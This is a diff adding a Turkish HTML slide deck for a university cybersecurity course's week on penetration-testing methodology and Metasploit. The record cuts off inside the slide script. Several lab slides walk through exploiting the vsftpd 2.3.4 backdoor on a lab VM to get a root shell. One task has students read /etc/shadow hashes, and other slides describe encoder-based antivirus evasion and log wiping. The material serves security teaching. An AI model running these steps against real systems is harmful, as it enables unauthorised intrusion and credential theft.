@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="tr" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Siber Saldırı ve Savunma Yöntemleri - Hafta 09 Sunumu | ezfesoft 26-27 Güz</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0f172a;
+            --bg-card: rgba(30, 41, 59, 0.75);
+            --bg-card-border: rgba(255, 255, 255, 0.12);
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent-color: #f43f5e;
+            --accent-glow: #f43f5e40;
+            --code-bg: #090d16;
+            --nav-bg: rgba(15, 23, 42, 0.85);
+            --radius: 16px;
+        }
+
+        [data-theme="light"] {
+            --bg-primary: #f1f5f9;
+            --bg-card: rgba(255, 255, 255, 0.92);
+            --bg-card-border: rgba(0, 0, 0, 0.08);
+            --text-primary: #0f172a;
+            --text-secondary: #475569;
+            --code-bg: #1e293b;
+            --nav-bg: rgba(241, 245, 249, 0.85);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            user-select: none;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        /* Header / Top Progress */
+        .top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 60px;
+            background: var(--nav-bg);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--bg-card-border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            z-index: 100;
+        }
+
+        .progress-container {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.05);
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-color), #38bdf8);
+            width: 0%;
+            transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .course-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 1.05rem;
+            color: var(--text-primary);
+            text-decoration: none;
+        }
+
+        .badge-pill {
+            background: var(--accent-glow);
+            color: var(--accent-color);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            border: 1px solid var(--accent-color);
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-icon {
+            background: var(--bg-card);
+            border: 1px solid var(--bg-card-border);
+            color: var(--text-primary);
+            width: 38px;
+            height: 38px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 1.1rem;
+        }
+
+        .btn-icon:hover {
+            background: var(--accent-color);
+            color: #fff;
+            transform: translateY(-1px);
+        }
+
+        /* Slide Viewport */
+        .slide-container {
+            flex: 1;
+            margin-top: 60px;
+            margin-bottom: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            position: relative;
+        }
+
+        .slide-card {
+            width: 100%;
+            max-width: 1100px;
+            min-height: 520px;
+            max-height: calc(100vh - 160px);
+            background: var(--bg-card);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--bg-card-border);
+            border-radius: var(--radius);
+            padding: 40px 48px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            overflow-y: auto;
+            position: relative;
+            animation: slideIn 0.35s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(12px) scale(0.98); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .slide-header {
+            margin-bottom: 20px;
+            border-bottom: 2px solid var(--bg-card-border);
+            padding-bottom: 16px;
+        }
+
+        .slide-meta {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--accent-color);
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+
+        .slide-title {
+            font-size: 2.1rem;
+            font-weight: 800;
+            line-height: 1.25;
+            background: linear-gradient(135deg, var(--text-primary) 40%, var(--accent-color));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .slide-subtitle {
+            font-size: 1.15rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+            margin-top: 6px;
+        }
+
+        .slide-body {
+            flex: 1;
+            font-size: 1.1rem;
+            line-height: 1.7;
+            color: var(--text-primary);
+        }
+
+        /* Content Formatting */
+        .content-paragraph {
+            margin-bottom: 14px;
+            white-space: pre-line;
+        }
+
+        .content-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 16px 0;
+        }
+
+        .content-list-item {
+            background: rgba(255,255,255,0.03);
+            border-left: 4px solid var(--accent-color);
+            padding: 12px 18px;
+            border-radius: 0 10px 10px 0;
+            font-size: 1.05rem;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .content-list-item::before {
+            content: "✦";
+            color: var(--accent-color);
+            font-weight: bold;
+        }
+
+        .step-badge {
+            background: var(--accent-color);
+            color: #fff;
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .code-block {
+            background: var(--code-bg);
+            border: 1px solid var(--bg-card-border);
+            border-radius: 12px;
+            padding: 16px 20px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.95rem;
+            color: #38bdf8;
+            overflow-x: auto;
+            margin: 16px 0;
+            white-space: pre-wrap;
+            user-select: text;
+        }
+
+        .visual-box {
+            margin-top: 20px;
+            background: rgba(0,0,0,0.2);
+            border: 1px dashed var(--accent-color);
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        /* Bottom Nav Controller */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 70px;
+            background: var(--nav-bg);
+            backdrop-filter: blur(12px);
+            border-top: 1px solid var(--bg-card-border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            z-index: 100;
+        }
+
+        .nav-center {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .btn-nav {
+            background: var(--accent-glow);
+            color: var(--accent-color);
+            border: 1px solid var(--accent-color);
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-nav:hover:not(:disabled) {
+            background: var(--accent-color);
+            color: #fff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px var(--accent-glow);
+        }
+
+        .btn-nav:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            border-color: transparent;
+        }
+
+        .slide-counter {
+            font-weight: 700;
+            font-size: 1.05rem;
+            min-width: 90px;
+            text-align: center;
+            background: var(--bg-card);
+            padding: 8px 16px;
+            border-radius: 20px;
+            border: 1px solid var(--bg-card-border);
+        }
+
+        /* Overview Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            z-index: 200;
+            display: none;
+            padding: 40px;
+            overflow-y: auto;
+        }
+
+        .modal-overlay.active {
+            display: block;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .grid-overview {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 16px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .thumb-card {
+            background: var(--bg-card);
+            border: 1px solid var(--bg-card-border);
+            border-radius: 12px;
+            padding: 16px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            height: 140px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .thumb-card:hover, .thumb-card.active {
+            border-color: var(--accent-color);
+            transform: scale(1.03);
+            box-shadow: 0 6px 20px var(--accent-glow);
+        }
+
+        .thumb-num {
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: var(--accent-color);
+        }
+
+        .thumb-title {
+            font-size: 0.95rem;
+            font-weight: 600;
+            line-height: 1.3;
+            display: -webkit-box;
+            -webkit-line-clamp: 3;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+
+        @media (max-width: 768px) {
+            .slide-card {
+                padding: 24px;
+                min-height: 440px;
+            }
+            .slide-title {
+                font-size: 1.5rem;
+            }
+            .bottom-nav {
+                padding: 0 12px;
+            }
+            .btn-nav span {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Navigation Bar -->
+    <header class="top-bar">
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <a href="../../README.md" class="course-badge">
+            <span>🛡️</span>
+            <span>Siber Saldırı ve Savunma Yöntemleri</span>
+            <span class="badge-pill">Hafta 09</span>
+        </a>
+        <div class="header-actions">
+            <button class="btn-icon" id="themeToggle" title="Temayı Değiştir (T)">☀️</button>
+            <button class="btn-icon" id="overviewToggle" title="Slayt Haritası (M / O)">📑</button>
+            <button class="btn-icon" id="fullscreenToggle" title="Tam Ekran (F)">⛶</button>
+        </div>
+    </header>
+
+    <!-- Main Presentation Slide Area -->
+    <main class="slide-container">
+        <div class="slide-card" id="slideCard">
+            <div class="slide-header">
+                <div class="slide-meta" id="slideMeta">SLAYT 1 / 32 • Siber Güvenlik & SOC</div>
+                <h1 class="slide-title" id="slideTitle">Yükleniyor...</h1>
+                <h2 class="slide-subtitle" id="slideSubtitle"></h2>
+            </div>
+            <div class="slide-body" id="slideBody">
+                <!-- Slide content injected by JS -->
+            </div>
+        </div>
+    </main>
+
+    <!-- Bottom Navigation Dock -->
+    <footer class="bottom-nav">
+        <div style="display: flex; gap: 8px;">
+            <a href="hafta-08.html" class="btn-nav" style="text-decoration:none;" >
+                <span>◀ Önceki Hafta</span>
+            </a>
+            <a href="../index.html" class="btn-nav" style="text-decoration:none;">
+                <span>📚 Ders Kataloğu</span>
+            </a>
+        </div>
+
+        <div class="nav-center">
+            <button class="btn-nav" id="prevBtn">
+                <span>◀</span> <span>Önceki</span>
+            </button>
+            <div class="slide-counter" id="slideCounter">1 / 32</div>
+            <button class="btn-nav" id="nextBtn">
+                <span>Sonraki</span> <span>▶</span>
+            </button>
+        </div>
+
+        <div style="display: flex; gap: 8px;">
+            <a href="hafta-10.html" class="btn-nav" style="text-decoration:none;" >
+                <span>Sonraki Hafta ▶</span>
+            </a>
+        </div>
+    </footer>
+
+    <!-- Overview Modal Grid -->
+    <div class="modal-overlay" id="overviewModal">
+        <div class="modal-header">
+            <h2>Slayt Haritası (32 Slayt)</h2>
+            <button class="btn-icon" id="closeModal">✕</button>
+        </div>
+        <div class="grid-overview" id="gridOverview"></div>
+    </div>
+
+    <script>
+        const slides = [{"baslik": "Siber Güvenlik: Hafta 9", "altbaslik": "Sızma Testleri (Pentest) Metodolojisi ve Metasploit Framework", "icerik": "Program: Bilişim Güvenliği Teknolojisi\nModül: Sızma Testi ve Sömürü (Exploitation)\nHaftalık Odak: Pentest Metodolojileri, Kutu Testleri, Metasploit Mimarisi ve vsftpd Exploit\nHedef: Güvenlik açıklarını tespit edip Metasploit ile yetkili erişim sağlamak.", "gorsel": {"type": "image", "query": "metasploit framework penetration testing ethical hacking terminal"}}, {"baslik": "Neden Bu Konuyu Öğreniyoruz?", "altbaslik": "Sektörel Bağlam: Saldırgandan Önce Açığı Bulmak", "icerik": "Bir sistemin güvenli olduğunu iddia etmek yetmez; sızma testi ile kanıtlamak gerekir.\n- Siyah şapkalı saldırganlar sızmadan önce Beyaz Şapkalı uzmanlar sistemi test eder.\n- Metasploit Framework, dünyadaki tüm siber güvenlik uzmanlarının standart aracıdır.", "gorsel": {"type": "image", "query": "penetration tester ethical hacker testing servers"}}, {"baslik": "Haftanın Öğrenme Kazanımları", "altbaslik": "Bu Dersin Sonunda Neler Kazanacaksınız?", "icerik": "1. Sızma Testi (Pentest) metodolojilerini (PTES, NIST) açıklar.\n2. Siyah, Beyaz ve Gri Kutu testlerinin kapsamını ve farklarını kavrar.\n3. Metasploit Framework modül türlerini (Exploit, Payload, Auxiliary) tanımlar.\n4. msfconsole komut satırında arama, yapılandırma ve çalıştırma yapar.\n5. Hedef zafiyetli makinedeki vsftpd backdoor açığını sömürüp root kabuğu alır.", "gorsel": {"type": "image", "query": "learning objectives penetration testing checklist"}}, {"baslik": "Sızma Testi (Penetration Test) Nedir?", "altbaslik": "Yasal ve İzinli Güvenlik Denetimi", "icerik": "Pentest: Kurumun yazılı izni ve sözleşmesi dahilinde, bir saldırgan gibi sistemdeki açıkları arama, sömürme (exploit) ve raporlama sürecidir.\nZafiyet Taramasından Farkı:\n- Zafiyet taraması sadece 'Burada açık olabilir' der (Teori).\n- Sızma testi o açığı bizzat istismar edip sisteme girerek kanıtlar (Pratik PoC).", "gorsel": {"type": "image", "query": "penetration test vs vulnerability scan diagram comparison"}}, {"baslik": "Kutu Testi Metodolojileri", "altbaslik": "Black Box, White Box ve Grey Box", "icerik": "1. Siyah Kutu (Black Box): Uzmana HİÇBİR BİLGİ verilmez. Dışarıdaki bilgisiz saldırganı simüle eder.\n2. Beyaz Kutu (White Box): Uzmana TÜM BİLGİLER (Kaynak kodlar, IP şeması, şifreler) verilir. En derinlemesine testtir.\n3. Gri Kutu (Grey Box): Uzmana SINIRLI BİLGİ verilir (Örn: Standart personel kullanıcı adı/şifresi).", "gorsel": {"type": "image", "query": "black box white box grey box testing methodology diagram"}}, {"baslik": "Sızma Testi Aşamaları (PTES Standardı)", "altbaslik": "7 Adımlı Profesyonel Süreç", "icerik": "1. Kapsam Belirleme (Pre-engagement)\n2. İstihbarat Toplama (Intelligence Gathering)\n3. Tehdit Modelleme (Threat Modeling)\n4. Zafiyet Analizi (Vulnerability Analysis)\n5. Sömürü (Exploitation)\n6. Sömürü Sonrası (Post-Exploitation)\n7. Raporlama (Reporting)", "gorsel": {"type": "image", "query": "ptes penetration testing execution standard 7 stages"}}, {"baslik": "Metasploit Framework Nedir?", "altbaslik": "Dünyanın En Güçlü İstismar Çerçevesi", "icerik": "Rapid7 tarafından geliştirilen, açık kaynaklı ve modüler sızma testi platformudur.\nBünyesinde:\n- 2400'den fazla hazır Exploit modülü\n- 1200'den fazla Auxiliary (yardımcı tarayıcı)\n- 600'den fazla Payload barındırır.", "gorsel": {"type": "image", "query": "metasploit framework rapid7 logo matrix background"}}, {"baslik": "Metasploit Modül Türleri", "altbaslik": "Exploit, Payload ve Auxiliary", "icerik": "- Exploit: Güvenlik açığını tetikleyip kapıyı açan saldırı kodudur.\n- Payload: Açılan kapıdan içeri sokulan ve komut çalıştırmamızı sağlayan zararlı yüktür (Reverse Shell, Meterpreter).\n- Auxiliary: Port tarama, servis sürümü bulma ve keşif yapan yardımcı araçlardır.\n- Post: Sisteme sızdıktan sonra yetki yükseltme ve şifre çekme modülleridir.", "gorsel": {"type": "image", "query": "metasploit module architecture exploit payload auxiliary"}}, {"baslik": "Temel msfconsole Komutları", "altbaslik": "Konsolda Gezinme Sözdizimi", "icerik": "- msfconsole : Konsolu başlatır.\n- search <kelime> : Exploit veya modül arar (Örn: search vsftpd).\n- use <modül_yolu> : İlgili modülü aktif eder.\n- show options : Doldurulması gereken zorunlu ayarları listeler.\n- set RHOSTS <IP> : Hedef sunucunun IP adresini ayarlar (Remote Host).\n- set LHOST <IP> : Kendi Kali IP adresinizi ayarlar (Local Host).\n- exploit veya run : Saldırıyı başlatır!", "gorsel": {"type": "image", "query": "msfconsole command line cheat sheet terminal"}}, {"baslik": "vsftpd 2.3.4 Backdoor Zafiyeti", "altbaslik": "Tarihi Bir Tedarik Zinciri Açığı", "icerik": "2011 yılında vsftpd FTP sunucusunun resmi kaynak kodlarına hackerlar tarafından gizli bir arka kapı (Backdoor) yerleştirildi.\nÇalışma Mantığı:\nKullanıcı adı sonuna gülücük işareti (:) eklenirse (Örn: admin:))\nsunucu 6200 portunda otomatik olarak root yetkisinde bir kabuk (shell) açar!", "gorsel": {"type": "image", "query": "vsftpd backdoor smiley face vulnerability code"}}, {"baslik": "Uygulama Laboratuvarı: Metasploit ile Sızma", "altbaslik": "Laboratuvar Hedeflerimiz", "icerik": "Laboratuvarımızda:\n- Hedef Makine: 192.168.1.50 (Sunucu 2 üzerinde koşan Metasploitable VM)\n1. Metasploit veritabanını başlatacağız.\n2. vsftpd exploit modülünü seçeceğiz.\n3. RHOSTS parametresini ayarlayıp exploit edeceğiz ve root yetkisi alacağız!", "gorsel": {"type": "image", "query": "students hacking target virtual machine computer lab"}}, {"baslik": "Uygulama 1: Metasploit Başlatma", "altbaslik": "msfconsole ve db_status", "icerik": "Terminalde şu komutları çalıştırın:\nsudo msfdb init\nmsfconsole -q\nKonsol açıldığında veritabanı durumunu kontrol edin:\nmsf6 > db_status\nBeklenen Çıktı: [*] Connected to msf. Connection type: postgresql.", "gorsel": {"type": "image", "query": "msfconsole banner terminal prompt start"}}, {"baslik": "Uygulama 2: Exploit Modülünü Arama ve Seçme", "altbaslik": "search ve use Komutları", "icerik": "Konsolda vsftpd modülünü arayalım:\nmsf6 > search vsftpd\nModülü seçelim:\nmsf6 > use exploit/unix/ftp/vsftpd_234_backdoor\nSeçildikten sonra konsol istemcisi kırmızıya döner:\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) >", "gorsel": {"type": "image", "query": "metasploit search use exploit terminal output"}}, {"baslik": "Uygulama 3: Hedef IP Belirleme ve Ayarlar", "altbaslik": "show options ve set RHOSTS", "icerik": "Zorunlu ayarları görelim:\nmsf6 exploit(...) > show options\nHedef makinenin IP adresini tanımlayalım:\nmsf6 exploit(...) > set RHOSTS 192.168.1.50\nAyarların doğru girildiğini 'show options' ile teyit edin.", "gorsel": {"type": "image", "query": "msfconsole show options set rhosts terminal"}}, {"baslik": "Uygulama 4: Sömürüyü Çalıştırma (Exploit!)", "altbaslik": "Sistemi Ele Geçirme", "icerik": "Saldırıyı başlatalım:\nmsf6 exploit(...) > exploit\nBeklenen Başarı Çıktısı:\n[+] 192.168.1.50:21 - Backdoor service spawned, sending payload...\n[*] Found shell.\n[*] Command shell session 1 opened!\nSistemin içine girdiniz!", "gorsel": {"type": "image", "query": "metasploit exploit success session opened terminal"}}, {"baslik": "Uygulama 5: Ele Geçirilen Sistemde Komut Koşturma", "altbaslik": "whoami ve Sistem Bilgisi", "icerik": "Açılan kabuk satırında şunları yazın:\nwhoami\nid\nuname -a\nSonuç:\nwhoami komutuna 'root' yanıtını aldınız!\nHedef Linux sunucunun en yetkili yöneticisisiniz.", "gorsel": {"type": "image", "query": "root shell whoami output terminal success"}}, {"baslik": "Sık Yapılan Hatalar ve İpuçları", "altbaslik": "Metasploit Kullanımında Dikkat Edilecekler", "icerik": "1. 'Exploit completed, but no session created': RHOSTS yanlış yazılmış olabilir veya hedef makinedeki 6200 portu o an başka öğrenci tarafından meşguldür.\n2. RHOSTS vs LHOST: RHOSTS (Remote Host) kurbanın IP'sidir, LHOST (Local Host) kendi Kali IP'nizdir.\n3. Konsoldan Çıkış: back komutu önceki menüye döner, exit konsolu kapatır.", "gorsel": {"type": "image", "query": "troubleshooting metasploit errors checklist warning"}}, {"baslik": "Sektörel Vaka: EternalBlue (WannaCry) Krizi", "altbaslik": "MS17-010 Zafiyeti", "icerik": "Vaka: NSA'dan sızdırılan EternalBlue açığı Metasploit'e modül olarak eklendi.\nİstismar: Saldırganlar bu modülü WannaCry fidye yazılımına entegre etti ve dünya çapında 200.000 Windows bilgisayarı dakikalar içinde kilitledi.\nDers: Kritik açıkların Metasploit modülü yayınlandığı anda tüm dünya tehdit altına girer; acil yama şarttır.", "gorsel": {"type": "image", "query": "wannacry ransomware locked screen hospital computers"}}, {"baslik": "Vaka Analizi: Pentest Raporlama Standartları", "altbaslik": "Yöneticiye Ne Sunulur?", "icerik": "Sızma testi bittiğinde müşteriye sunulan raporun ana başlıkları:\n1. Yönetici Özeti (Executive Summary): Teknik olmayan üst yöneticiye risk seviyesi (Kritik/Yüksek).\n2. Zafiyet Kanıtı (PoC - Proof of Concept): Alınan root ekran görüntüleri.\n3. İyileştirme ve Kapatma Önerileri (Remediation).", "gorsel": {"type": "image", "query": "penetration test report document executive summary"}}, {"baslik": "Mini Quiz: Soru 1", "altbaslik": "Kutu Testleri", "icerik": "Soru: Sızma testi uzmanına hedef sistem hakkında hiçbir bilgi verilmeyen test türüne ne ad verilir?\nA) Beyaz Kutu (White Box)\nB) Siyah Kutu (Black Box)\nC) Gri Kutu (Grey Box)\nD) Şeffaf Kutu\n\nDoğru Cevap: B (Siyah Kutu / Black Box)", "gorsel": {"type": "image", "query": "quiz question multiple choice exam board"}}, {"baslik": "Mini Quiz: Soru 2", "altbaslik": "Metasploit Kavramları", "icerik": "Soru: Metasploit'te açığı tetikleyip kapıyı açan koda ne ad verilir?\nA) Payload\nB) Exploit\nC) Encoder\nD) NOP\n\nDoğru Cevap: B (Exploit)", "gorsel": {"type": "image", "query": "exploit definition test question"}}, {"baslik": "Mini Quiz: Soru 3", "altbaslik": "Metasploit Komutları", "icerik": "Soru: Metasploit konsolunda hedef kurban makinenin IP adresini ayarlamak için hangi komut kullanılır?\nA) set LHOST\nB) set RHOSTS\nC) set TARGET\nD) set VICTIM\n\nDoğru Cevap: B (set RHOSTS)", "gorsel": {"type": "image", "query": "metasploit command rhosts question multiple choice"}}, {"baslik": "Mini Quiz: Soru 4", "altbaslik": "Payload Tanımı", "icerik": "Soru: Sisteme sızıldıktan sonra kurban makinede çalışan ve komut çalıştırmayı sağlayan zararlı yüke ne ad verilir?\nA) Payload\nB) Scanner\nC) Firewall\nD) Ping\n\nDoğru Cevap: A (Payload)", "gorsel": {"type": "image", "query": "payload definition question board"}}, {"baslik": "Mini Quiz: Soru 5", "altbaslik": "Metodoloji", "icerik": "Soru: Dünyada sızma testleri için kabul görmüş 7 aşamalı profesyonel metodoloji standardı hangisidir?\nA) PTES\nB) ISO 9001\nC) IEEE 802.11\nD) W3C\n\nDoğru Cevap: A (PTES)", "gorsel": {"type": "image", "query": "ptes standard question test"}}, {"baslik": "Sınıf İçi Tartışma ve Uygulama", "altbaslik": "Hedefte Dosya Arama", "icerik": "Uygulama Görevi:\nRoot kabuğunu aldığınız hedef makinede:\ncat /etc/shadow komutunu çalıştırıp ekrandaki root parolasının hashini ilk gören öğrenci el kaldırsın!", "gorsel": {"type": "image", "query": "students competition classroom coding linux challenge"}}, {"baslik": "Zafiyet Veritabanları: CVE ve NVD", "altbaslik": "Açıkların Küresel Kimlik Numarası", "icerik": "CVE (Common Vulnerabilities and Exposures):\nDünyada keşfedilen her güvenlik açığına verilen benzersiz kimlik kodudur (Örn: CVE-2021-44228 Log4j).\n- NVD (National Vulnerability Database): Açığın CVSS puanını (1-10 arası risk derecesi) ve kapatma yöntemini yayınlar.\nPentesterlar Nmap'ten aldıkları sürümü CVE veritabanlarında aratır.", "gorsel": {"type": "image", "query": "cve nvd vulnerability database score matrix"}}, {"baslik": "Exploit-DB ve Searchsploit", "altbaslik": "Açık Kaynak Exploit Arşivi", "icerik": "Exploit-DB (Offensive Security):\nDünyadaki tüm çalışan exploit kodlarının toplandığı resmi arşivdir.\nSearchsploit:\nKali Linux'ta internet bağlantısı olmadan çevrimdışı exploit arayan komut satırı aracıdır.\nÖrnek:\nsearchsploit vsftpd 2.3.4", "gorsel": {"type": "image", "query": "searchsploit exploit db terminal command line search"}}, {"baslik": "Metasploit Encoder Modülleri", "altbaslik": "Zararlı Kodu Antivirüsten Gizlemek", "icerik": "Payload kodları açık metin baytlar içerirse antivirüsler tarafından imza tabanlı olarak anında yakalanır.\nEncoderlar (Örn: shikata_ga_nai):\nPayload'un baytlarını XOR işlemleriyle polimorfik olarak şifreler, böylece dosya imzası değişir ve basit antivirüsleri atlatır.", "gorsel": {"type": "image", "query": "metasploit encoder shikata ga nai obfuscation diagram"}}, {"baslik": "Çözümlü Vaka: Nmap'ten Exploit'e Geçiş", "altbaslik": "Uçtan Uca Sızma Akışı", "icerik": "Adım 1 (Nmap): sudo nmap -sV 192.168.1.50 -> vsftpd 2.3.4 bulundu.\nAdım 2 (Araştırma): searchsploit vsftpd 2.3.4 -> Backdoor bulundu.\nAdım 3 (Metasploit): use exploit/unix/ftp/vsftpd_234_backdoor\nAdım 4 (Yapılandırma): set RHOSTS 192.168.1.50\nAdım 5 (Sömürü): exploit -> root kabuğu alındı!", "gorsel": {"type": "image", "query": "penetration testing workflow nmap to metasploit diagram"}}, {"baslik": "Haftalık Konu Özeti", "altbaslik": "Bu Hafta Neler Öğrendik?", "icerik": "- Sızma testleri (Pentest) metodolojik ve yasal izinli güvenlik denetimleridir.\n- Kutu testleri (Black/White/Grey) farklı saldırgan profillerini simüle eder.\n- Metasploit Framework exploit ve payload mimarisiyle sömürüyü otomatikleştirir.\n- Elde edilen yetkiler mutlaka profesyonel bir raporla kuruma sunulmalıdır.", "gorsel": {"type": "image", "query": "summary concept mind map review"}}, {"baslik": "Gelecek Haftaya Bakış", "altbaslik": "Hafta 10: İleri Sızma Testi ve Sömürü Sonrası (Meterpreter)", "icerik": "Ön Hazırlık:\n- Meterpreter payload'u neden antivirüslere yakalanmaz?\n- msfvenom ile özel Trojan ve ajan dosyaları nasıl üretilir?\n- Ele geçirilen hedefte yetki yükseltme ve iz silme (clearev) nasıl yapılır?", "gorsel": {"type": "image", "query": "meterpreter post exploitation privilege escalation concept"}}, {"baslik": "Çıkış Bileti (Exit Ticket)", "altbaslik": "Dersi Bitirmeden Önce Cevaplayınız", "icerik": "Günün Sorusu:\n'Metasploit'te Exploit ile Payload arasındaki farkı ve ilişkisini tek bir somut örnekle açıklayınız.'\n\nCevabınızı kâğıda yazıp teslim ediniz.", "gorsel": {"type": "image", "query": "exit ticket paper feedback classroom student"}}];
+        let currentIndex = 0;
+
+        const slideTitle = document.getElementById('slideTitle');
+        const slideSubtitle = document.getElementById('slideSubtitle');
+        const slideBody = document.getElementById('slideBody');
+        const slideMeta = document.getElementById('slideMeta');
+        const slideCounter = document.getElementById('slideCounter');
+        const progressBar = document.getElementById('progressBar');
+
+        const prevBtn = document.getElementById('prevBtn');
+        const nextBtn = document.getElementById('nextBtn');
+        const slideCard = document.getElementById('slideCard');
+
+        const themeToggle = document.getElementById('themeToggle');
+        const overviewToggle = document.getElementById('overviewToggle');
+        const overviewModal = document.getElementById('overviewModal');
+        const closeModal = document.getElementById('closeModal');
+        const gridOverview = document.getElementById('gridOverview');
+        const fullscreenToggle = document.getElementById('fullscreenToggle');
+
+        function formatContent(text) {
+            if (!text) return '';
+            const lines = text.split('\n');
+            let html = '';
+            let inList = false;
+
+            lines.forEach((line) => {
+                const trimmed = line.trim();
+                if (!trimmed) return;
+
+                if (trimmed.startsWith('- ') || trimmed.startsWith('* ')) {
+                    if (!inList) {
+                        html += '<ul class="content-list">';
+                        inList = true;
+                    }
+                    html += `<li class="content-list-item">${trimmed.substring(2)}</li>`;
+                }
+                else if (/^\d+\.\s/.test(trimmed)) {
+                    if (inList) {
+                        html += '</ul>';
+                        inList = false;
+                    }
+                    const match = trimmed.match(/^(\d+)\.\s+(.*)/);
+                    if (match) {
+                        html += `<div class="content-list-item"><span class="step-badge">${match[1]}</span><span>${match[2]}</span></div>`;
+                    }
+                }
+                else if (trimmed.includes(';') || trimmed.includes('{') || trimmed.includes('}') || trimmed.includes('print(') || trimmed.includes('def ')) {
+                    if (inList) { html += '</ul>'; inList = false; }
+                    html += `<div class="code-block">${trimmed}</div>`;
+                }
+                else {
+                    if (inList) { html += '</ul>'; inList = false; }
+                    html += `<div class="content-paragraph">${trimmed}</div>`;
+                }
+            });
+
+            if (inList) html += '</ul>';
+            return html;
+        }
+
+        function renderSlide(index) {
+            if (index < 0 || index >= slides.length) return;
+            currentIndex = index;
+            const slide = slides[currentIndex];
+
+            slideCard.style.animation = 'none';
+            slideCard.offsetHeight;
+            slideCard.style.animation = 'slideIn 0.35s cubic-bezier(0.16, 1, 0.3, 1)';
+
+            slideTitle.textContent = slide.baslik || 'Başlıksız Slayt';
+            slideSubtitle.textContent = slide.altbaslik || '';
+            
+            let bodyHTML = formatContent(slide.icerik);
+            if (slide.gorsel && slide.gorsel.query) {
+                bodyHTML += `<div class="visual-box">🖼️ <strong>Görsel Analoji & Tematik Kavram:</strong> ${slide.gorsel.query}</div>`;
+            }
+            slideBody.innerHTML = bodyHTML;
+
+            slideMeta.textContent = `SLAYT ${currentIndex + 1} / ${slides.length} • Siber Güvenlik & SOC`;
+            slideCounter.textContent = `${currentIndex + 1} / ${slides.length}`;
+            
+            const pct = ((currentIndex + 1) / slides.length) * 100;
+            progressBar.style.width = `${pct}%`;
+
+            prevBtn.disabled = currentIndex === 0;
+            nextBtn.disabled = currentIndex === slides.length - 1;
+
